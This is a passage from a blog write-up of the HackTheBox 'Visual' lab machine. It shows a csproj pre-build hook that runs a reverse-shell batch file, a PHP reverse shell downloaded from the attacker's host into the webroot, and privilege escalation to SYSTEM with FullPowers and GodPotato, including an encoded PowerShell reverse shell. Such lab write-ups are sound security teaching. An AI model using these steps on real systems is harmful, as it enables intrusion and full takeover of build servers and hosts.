</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Build started 10/2/2023 8:19:35 AM.
</span></span><span class="line"><span class="cl">Logging verbosity is set to: Detailed.Process = &#34;C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\msbuild.exe&#34;
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">Build FAILED.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#34;C:\Windows\Temp\32a8f43cea993e0b28dd5c9e25ec34\Chip8.sln&#34; (default target) (1) -&gt;
</span></span><span class="line"><span class="cl">(Build target) -&gt; 
</span></span><span class="line"><span class="cl">  C:\Windows\Temp\32a8f43cea993e0b28dd5c9e25ec34\Chip8.sln.metaproj : error MSB3202: The project file &#34;C:\Windows\Temp\32a8f43cea993e0b28dd5c9e25ec34\Chip8\Chip8.csproj&#34; was not found. [C:\Windows\Temp\32a8f43cea993e0b28dd5c9e25ec34\Chip8.sln]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    0 Warning(s)
</span></span><span class="line"><span class="cl">    1 Error(s)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Time Elapsed 00:00:00.34
</span></span></code></pre></td></tr></table>
</div>
</div><p>For whatever reason, it is unable to find dependencies in the Chip8 folder.. After moving files around and trying other simple renaming tactics, I was unable to get the Chip8 emulator to build.</p>
<h4 id="creating-a-simple-dotnet-project">Creating a simple dotnet project
</h4><p>Next, I opted for a more simple project starting with a <a class="link" href="https://dotnet.microsoft.com/en-us/learn/dotnet/hello-world-tutorial/intro"  target="_blank" rel="noopener"
    >basic dotnet tutorial</a>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/visual/test2]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ dotnet new console -o MyApp -f net6.0
</span></span><span class="line"><span class="cl">The template &#34;Console App&#34; was created successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Processing post-creation actions...
</span></span><span class="line"><span class="cl">Running &#39;dotnet restore&#39; on /home/kali/Documents/visual/test2/MyApp/MyApp.csproj...
</span></span><span class="line"><span class="cl">  Determining projects to restore...
</span></span><span class="line"><span class="cl">  Restored /home/kali/Documents/visual/test2/MyApp/MyApp.csproj (in 126 ms).
</span></span><span class="line"><span class="cl">Restore succeeded.
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/visual/test2]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ cd MyApp 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/visual/test2/MyApp]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ ls
</span></span><span class="line"><span class="cl">MyApp.csproj  obj  Program.cs
</span></span></code></pre></td></tr></table>
</div>
</div><p>Trying to build now will result in an error about missing the <code>sln</code> file, so I grabbed the Chip8.sln file from earlier, and fixed the names to &ldquo;MyApp&rdquo;:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Microsoft Visual Studio Solution File, Format Version 12.00
</span></span><span class="line"><span class="cl"># Visual Studio 15
</span></span><span class="line"><span class="cl">VisualStudioVersion = 15.0.28010.2050
</span></span><span class="line"><span class="cl">MinimumVisualStudioVersion = 10.0.40219.1
</span></span><span class="line"><span class="cl">Project(&#34;{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}&#34;) = &#34;MyApp&#34;, &#34;MyApp.csproj&#34;, &#34;{740C32CA-9964-445F-8514-062C4228FD28}&#34;
</span></span><span class="line"><span class="cl">EndProject
</span></span><span class="line"><span class="cl">Global
</span></span><span class="line"><span class="cl">	GlobalSection(SolutionConfigurationPlatforms) = preSolution
</span></span><span class="line"><span class="cl">		Debug|Any CPU = Debug|Any CPU
</span></span><span class="line"><span class="cl">		Release|Any CPU = Release|Any CPU
</span></span><span class="line"><span class="cl">	EndGlobalSection
</span></span><span class="line"><span class="cl">	GlobalSection(ProjectConfigurationPlatforms) = postSolution
</span></span><span class="line"><span class="cl">		{740C32CA-9964-445F-8514-062C4228FD28}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
</span></span><span class="line"><span class="cl">		{740C32CA-9964-445F-8514-062C4228FD28}.Debug|Any CPU.Build.0 = Debug|Any CPU
</span></span><span class="line"><span class="cl">		{740C32CA-9964-445F-8514-062C4228FD28}.Release|Any CPU.ActiveCfg = Release|Any CPU
</span></span><span class="line"><span class="cl">		{740C32CA-9964-445F-8514-062C4228FD28}.Release|Any CPU.Build.0 = Release|Any CPU
</span></span><span class="line"><span class="cl">	EndGlobalSection
</span></span><span class="line"><span class="cl">	GlobalSection(SolutionProperties) = preSolution
</span></span><span class="line"><span class="cl">		HideSolutionNode = FALSE
</span></span><span class="line"><span class="cl">	EndGlobalSection
</span></span><span class="line"><span class="cl">	GlobalSection(ExtensibilityGlobals) = postSolution
</span></span><span class="line"><span class="cl">		SolutionGuid = {45D5498A-0A7F-455B-B1DD-4A93EFD46DE3}
</span></span><span class="line"><span class="cl">	EndGlobalSection
</span></span><span class="line"><span class="cl">EndGlobal
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now when we submit this repo for building, the build will pass! We are given the following files in return:
<img src="/p/hackthebox-visual/Images/build.png"
	width="769"
	height="448"
	srcset="/p/hackthebox-visual/Images/build_hu16343778510661435376.png 480w, /p/hackthebox-visual/Images/build_hu3103956357474951177.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="171"
		data-flex-basis="411px"
	
>
Now we can have the service build executables for us, but how can this be abused? The key hint is the emphasis on using visual studio.</p>
<h3 id="exploiting-vss-pre-build-event">Exploiting VS&rsquo;s pre-build event
</h3><p>Visual Studio supports <a class="link" href="https://learn.microsoft.com/en-us/visualstudio/ide/reference/pre-build-event-post-build-event-command-line-dialog-box?view=vs-2022"  target="_blank" rel="noopener"
    >pre-build event execution</a> that we can use to execute our own malicious scripts. The easiest way to do so is use Visual Studio&rsquo;s GUI, however I do not have this installed. I used <a class="link" href="https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022"  target="_blank" rel="noopener"
    >this article</a> as a reference to introduce manually. Very simply, we can add a reverse shell <code>bat</code> file to our repository, and edit the <code>csproj</code> file to call the file. <code>MyApp2.csproj</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;Project</span> <span class="na">Sdk=</span><span class="s">&#34;Microsoft.NET.Sdk&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;Target</span> <span class="na">Name=</span><span class="s">&#34;PreBuild&#34;</span> <span class="na">BeforeTargets=</span><span class="s">&#34;PreBuildEvent&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Exec</span> <span class="na">Command=</span><span class="s">&#34;call prebuild.bat&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Target&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;PropertyGroup&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;OutputType&gt;</span>Exe<span class="nt">&lt;/OutputType&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;TargetFramework&gt;</span>net6.0<span class="nt">&lt;/TargetFramework&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ImplicitUsings&gt;</span>enable<span class="nt">&lt;/ImplicitUsings&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Nullable&gt;</span>enable<span class="nt">&lt;/Nullable&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/PropertyGroup&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Project&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The new repository:
<img src="/p/hackthebox-visual/Images/prebuild.png"
	width="734"
	height="602"
	srcset="/p/hackthebox-visual/Images/prebuild_hu15980687907561900571.png 480w, /p/hackthebox-visual/Images/prebuild_hu684777651022371664.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="121"
		data-flex-basis="292px"
	
>
Now when this is submitted for building, I receive a connection on my <code>nc</code> listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/visual/test4/MyApp2]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ nc -nvlp 443
</span></span><span class="line"><span class="cl">listening on [any] 443 ...
</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.139.209] 49710
</span></span><span class="line"><span class="cl">whoami                                                                                                              
</span></span><span class="line"><span class="cl">visual\enox                                                                                                         
</span></span><span class="line"><span class="cl">PS C:\Windows\Temp\b492bdbeb505f5afab24f97c093323&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="lateral-movement">Lateral Movement
</h2><p>After some enumeration, there isn&rsquo;t much to be done with user <code>enox</code>, so I decide to insert a php reverse shell into the webroot directory. For Windows machines, service accounts will very commonly have the <code>SeImpersonate</code> privilege, which can be used in a potato attack to reach <code>NT Authority/SYSTEM</code> level privileges. The reverse shell used was obtained from <a class="link" href="https://github.com/Dhayalanb/windows-php-reverse-shell/tree/master"  target="_blank" rel="noopener"
    >https://github.com/Dhayalanb/windows-php-reverse-shell/tree/master</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\xampp\htdocs&gt; wget 10.10.14.134/rev.php -outfile rev.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now upon visiting the page at <code>http://10.10.139.209/rev.php</code>, we receive a connection back:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/visual]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ nc -nvlp 443
</span></span><span class="line"><span class="cl">listening on [any] 443 ...
</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.145.35] 49674
</span></span><span class="line"><span class="cl">b374k shell : connected
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Microsoft Windows [Version 10.0.17763.4840]
</span></span><span class="line"><span class="cl">(c) 2018 Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:\temp2&gt;whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">nt authority\local service
</span></span></code></pre></td></tr></table>
</div>
</div><p>We are now <code>NT Authority\local service</code>, but unfortunately this does not have the same powers as <code>NT Authority\System</code>. In addition to low filesystem permissions, we have very limited privileges:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users&gt;whoami /priv
</span></span><span class="line"><span class="cl">whoami /priv
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                Description                    State   
</span></span><span class="line"><span class="cl">============================= ============================== ========
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege       Create global objects          Enabled 
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">Privilege Escalation
</h2><p>Fortunately, there is a way to improve our privilege access. <a class="link" href="https://github.com/itm4n/FullPowers"  target="_blank" rel="noopener"
    >FullPowers</a> is a tool we can use to recover the default privilege set of a service account, including SeImpersonate privilege. If we acquire this, we can launch a potato-style attack. Using FullPowers.exe:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp2&gt;.\FullPowers.exe
</span></span><span class="line"><span class="cl">.\FullPowers.exe
</span></span><span class="line"><span class="cl">[+] Started dummy thread with id 2444
</span></span><span class="line"><span class="cl">[+] Successfully created scheduled task.
</span></span><span class="line"><span class="cl">[+] Got new token! Privilege count: 7
</span></span><span class="line"><span class="cl">[+] CreateProcessAsUser() OK
</span></span><span class="line"><span class="cl">Microsoft Windows [Version 10.0.17763.4851]
</span></span><span class="line"><span class="cl">(c) 2018 Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:\Windows\system32&gt;whoami /priv
</span></span><span class="line"><span class="cl">whoami /priv
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                Description                               State  
</span></span><span class="line"><span class="cl">============================= ========================================= =======
</span></span><span class="line"><span class="cl">SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
</span></span><span class="line"><span class="cl">SeAuditPrivilege              Generate security audits                  Enabled
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
</span></span><span class="line"><span class="cl">SeImpersonatePrivilege        Impersonate a client after authentication Enabled
</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege       Create global objects                     Enabled
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>After launching, SeImpersonatePrivilege is now present, and we can achieve full system compromise through <a class="link" href="https://github.com/BeichenDream/GodPotato"  target="_blank" rel="noopener"
    >GodPotato</a>.
Using GodPotato.exe, I execute a <code>bat</code> file consisting of a base64-encoded reverse shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp2&gt;.\gp.exe -cmd &#34;C:\temp2\rev.bat&#34;
</span></span><span class="line"><span class="cl">.\gp.exe -cmd &#34;C:\temp2\rev.bat&#34;
</span></span><span class="line"><span class="cl">[*] CombaseModule: 0x140705454620672
</span></span><span class="line"><span class="cl">[*] DispatchTable: 0x140705456926832
</span></span><span class="line"><span class="cl">[*] UseProtseqFunction: 0x140705456303008
</span></span><span class="line"><span class="cl">[*] UseProtseqFunctionParamCount: 6
</span></span><span class="line"><span class="cl">[*] HookRPC
</span></span><span class="line"><span class="cl">[*] Start PipeServer
</span></span><span class="line"><span class="cl">[*] Trigger RPCSS
</span></span><span class="line"><span class="cl">[*] CreateNamedPipe \\.\pipe\2d864ad4-a01d-4f46-a771-5551b936f542\pipe\epmapper
</span></span><span class="line"><span class="cl">[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
</span></span><span class="line"><span class="cl">[*] DCOM obj IPID: 00008402-1318-ffff-b73e-c6eaecf7b199
</span></span><span class="line"><span class="cl">[*] DCOM obj OXID: 0xa2eebb464a7a9dc0
</span></span><span class="line"><span class="cl">[*] DCOM obj OID: 0x1b73e71602e012f3
</span></span><span class="line"><span class="cl">[*] DCOM obj Flags: 0x281
</span></span><span class="line"><span class="cl">[*] DCOM obj PublicRefs: 0x0
</span></span><span class="line"><span class="cl">[*] Marshal Object bytes len: 100
</span></span><span class="line"><span class="cl">[*] UnMarshal Object
</span></span><span class="line"><span class="cl">[*] Pipe Connected!
</span></span><span class="line"><span class="cl">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
</span></span><span class="line"><span class="cl">[*] CurrentsImpersonationLevel: Impersonation
</span></span><span class="line"><span class="cl">[*] Start Search System Token
</span></span><span class="line"><span class="cl">[*] PID : 872 Token:0x800  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
</span></span><span class="line"><span class="cl">[*] Find System Token : True
</span></span><span class="line"><span class="cl">[*] UnmarshalObject: 0x80070776
</span></span><span class="line"><span class="cl">[*] CurrentUser: NT AUTHORITY\SYSTEM
</span></span><span class="line"><span class="cl">[*] process start with pid 3388
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:\temp2&gt;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQ&lt;...SNIP...&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Meanwhile on my listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ nc -nvlp 443
</span></span><span class="line"><span class="cl">listening on [any] 443 ...
</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.145.35] 49681
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">nt authority\system
</span></span><span class="line"><span class="cl">PS C:\temp2&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we have full access to the system.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/gitea/">Gitea</a>
        
            <a href="/tags/visual-studio/">Visual Studio</a>
        
            <a href="/tags/fullpowers/">FullPowers</a>
        
            <a href="/tags/godpotato/">GodPotato</a>
        
            <a href="/tags/dotnet/">Dotnet</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/hackthebox-drive/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-drive/Drive.0a2a46fe54b3fb58a269f4b35b5ab403_hu7481452741760639705.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Drive"
                        
                        data-hash="md5-CipG/lSz&#43;1iiafSzW1q0Aw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Drive</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-mailroom/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-mailroom/Mailroom.0954462925d337843baeedfaf8bb9ccf_hu4146993554582274269.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Mailroom"
                        
                        data-hash="md5-CVRGKSXTN4Q7ru36&#43;Luczw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Mailroom</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-busqueda/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-busqueda/Busqueda.fc4856cd6b9e5aa954d7face3968a69d_hu12336566156959704981.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Busqueda"
                        
                        data-hash="md5-/EhWzWueWqlU1/rOOWimnQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Busqueda</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-devvortex/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu4257021157125360887.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Devvortex"
                        
                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Devvortex</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-surveillance/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Surveillance"
                        
                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Surveillance</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
